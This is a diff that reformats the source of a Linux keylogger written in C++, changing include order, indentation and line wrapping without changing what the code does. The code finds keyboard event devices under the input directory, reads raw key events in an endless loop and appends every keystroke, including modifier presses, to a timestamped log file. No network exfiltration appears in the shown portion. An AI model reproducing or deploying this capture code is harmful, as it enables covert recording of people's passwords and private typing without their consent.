@@ -1,48 +1,51 @@
-#include <iostream>
-#include <string>
-#include <fstream>
-#include <regex>
-#include <vector>
-#include <future>
-#include <cstdlib>
-#include <ctime>
-#include <iomanip>
-#include <cstring>
-#include <unistd.h>
-#include <fcntl.h>
 #include <dirent.h>
+#include <fcntl.h>
 #include <linux/input.h>
 #include <linux/version.h>
 #include <sys/ioctl.h>
+#include <unistd.h>
+#include <cstdlib>
+#include <cstring>
+#include <ctime>
+#include <fstream>
+#include <future>
+#include <iomanip>
+#include <iostream>
+#include <regex>
+#include <string>
+#include <vector>
+
 #include "constants.hh"
 
 bool DEBUG = false;
-void DEBUG_STDOUT(std::string msg) { if(DEBUG) std::cout << msg << std::endl; }
-void DEBUG_STDERR(std::string msg) { if(DEBUG) std::cerr << msg << std::endl; }
+void DEBUG_STDOUT(std::string msg) {
+    if (DEBUG) std::cout << msg << std::endl;
+}
+void DEBUG_STDERR(std::string msg) {
+    if (DEBUG) std::cerr << msg << std::endl;
+}
 
 static void* _startCapture(void* threadData);
 
-static int _isEventDevice(const struct dirent *directory) {
+static int _isEventDevice(const struct dirent* directory) {
     return strncmp(EVENT_DEVICE_NAME.c_str(), directory->d_name, 5) == 0;
 }
 
 class Keyboard {
-    public:
-        std::string devicePath, captureLog;
-        int deviceFile;
+   public:
+    std::string devicePath, captureLog;
+    int deviceFile;
 
-        Keyboard(std::string devPath, std::string capLog) {
-            devicePath = devPath, captureLog = capLog;
-            deviceFile = -1;
-        }
+    Keyboard(std::string devPath, std::string capLog) {
+        devicePath = devPath, captureLog = capLog;
+        deviceFile = -1;
+    }
 
-        ~Keyboard() { close(deviceFile); }
+    ~Keyboard() { close(deviceFile); }
 
-        void openDeviceFile() {
-            deviceFile = open(devicePath.c_str(), O_RDONLY);
-        }
+    void openDeviceFile() { deviceFile = open(devicePath.c_str(), O_RDONLY); }
 
-        void capture();
+    void capture();
 };
 
 void Keyboard::capture() {
@@ -51,35 +54,33 @@ void Keyboard::capture() {
     const char* output;
 
     // Open log file and keyboard device file
-    std::ofstream logFileStream (captureLog, std::ios::app);
+    std::ofstream logFileStream(captureLog, std::ios::app);
     openDeviceFile();
 
     if (deviceFile > 0) {
-
         // Write timestamp
         std::time_t time = std::time(nullptr);
-        logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
-            << "-------------------------------------\n";
+        logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z")
+                      << " |\n"
+                      << "-------------------------------------\n";
 
         // Capture keystrokes
-        while(true) {
-            readEvent = read(deviceFile, keyEvent, sizeof(struct input_event) * 64);
+        while (true) {
+            readEvent =
+                read(deviceFile, keyEvent, sizeof(struct input_event) * 64);
 
-            if(readEvent > 0) {
+            if (readEvent > 0) {
                 eventType = keyEvent[1].value;
                 output = keys[keyEvent[1].code];
                 /* Record press and release for
                    modifier keys (shift, ctrl, and super) */
-                if(eventType != 2 && (
-                            std::strncmp(output, "<su", 3) == 0
-                            || std::strncmp(output, "<l-", 3) == 0
-                            || std::strncmp(output, "<r-", 3) == 0
-                            )
-                  ) {
+                if (eventType != 2 && (std::strncmp(output, "<su", 3) == 0 ||
+                                       std::strncmp(output, "<l-", 3) == 0 ||
+                                       std::strncmp(output, "<r-", 3) == 0)) {
                     DEBUG_STDOUT(output + (" " + std::to_string(eventType)));
-                    logFileStream << output << " " << keyEvent[1].value << std::endl;
-                }
-                else if(eventType != 0) {
+                    logFileStream << output << " " << keyEvent[1].value
+                                  << std::endl;
+                } else if (eventType != 0) {
                     logFileStream << output << std::endl;
                     DEBUG_STDOUT(output);
                 }
@@ -89,13 +90,14 @@ void Keyboard::capture() {
 }
 
 std::vector<Keyboard> findKeyboards() {
-    struct dirent **nameList;
+    struct dirent** nameList;
     std::vector<Keyboard> keyboards;
 
     // Get number and list of devices in event device directory
-    int numDevices = scandir(INPUT_DEVICE_DIR.c_str(), &nameList, _isEventDevice, versionsort);
+    int numDevices = scandir(INPUT_DEVICE_DIR.c_str(), &nameList,
+                             _isEventDevice, versionsort);
 
-    for (int i=0; i < numDevices; ++i) {
+    for (int i = 0; i < numDevices; ++i) {
         std::string deviceName, devicePath;
         char deviceInfo[256];
         int deviceFile = -1;
@@ -121,7 +123,7 @@ std::vector<Keyboard> findKeyboards() {
         }
         free(nameList[i]);
     }
-    if(not keyboards.size()) DEBUG_STDERR("No keyboards found.");
+    if (not keyboards.size()) DEBUG_STDERR("No keyboards found.");
 
     return keyboards;
 }
